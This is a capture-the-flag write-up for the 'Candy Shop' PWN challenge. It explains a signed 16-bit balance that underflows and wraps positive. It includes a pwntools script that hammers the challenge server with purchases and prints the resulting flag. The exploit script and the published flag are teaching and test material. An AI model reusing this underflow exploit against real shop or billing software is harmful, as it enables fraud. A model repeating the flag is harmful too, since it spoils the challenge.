# HASBLCTF Writeup: Candy Shop

**CTF Name:** HASBLCTF  
**Category:** PWN  
**Challenge/Task Name:** Candy Shop  
**Difficulty:** Easy/Medium  
**Author:** Phantom Blaze  
**Target:** `nc 34.77.68.154 10003`

## Objective
Every child loves eating candy... but as much as we love flags. Exploit the shop's balance system to purchase the flag item.

## Solution / Walkthrough

### 1. Analyzing the Binary
The decompiled binary reveals a candy shop where the player starts with a balance and can buy items. The critical flaw is in the `balance` variable declaration — it uses an **`int16_t`** (signed 16-bit integer), which has a range of `-32768` to `32767`.

The shop offers these items:
- Turkish Delight — costs some amount
- Chocolate — costs some amount
- **Flag** — costs a large amount (too expensive with starting balance)

### 2. The Integer Underflow Vulnerability
Since the balance is a signed 16-bit integer, repeatedly purchasing cheap items will eventually push the balance below `-32768`. Due to two's complement arithmetic, subtracting past the minimum value causes it to **wrap around to a large positive value**.

```
Balance wrapping: -32768 - 1 = +32767
```

### 3. The Exploit Strategy
1. Repeatedly buy **Turkish Delight** (59 times) and **Chocolate** (298 times)
2. Each purchase subtracts from the `int16_t` balance
3. When the balance wraps past `-32768`, it becomes a large positive number (`~32753`)
4. Use the inflated balance to purchase the flag

```python
from pwn import *

r = remote('34.77.68.154', 10003)

# Buy Turkish Delight 59 times to drain balance
for _ in range(59):
    r.sendline(b'1')  # Select Turkish Delight
    r.recvuntil(b'>')

# Buy Chocolate 298 times to trigger underflow
for _ in range(298):
    r.sendline(b'2')  # Select Chocolate
    r.recvuntil(b'>')

# Balance has wrapped to positive! Buy the flag
r.sendline(b'3')  # Select Flag item
print(r.recvall().decode())
```

### 4. Retrieving the Flag
After the integer underflow, the balance wraps to a large positive value, allowing us to buy the flag item.

**Flag:**  
`HASBL{Turk1sh_D3l1ght_15_Th3_B35t}`
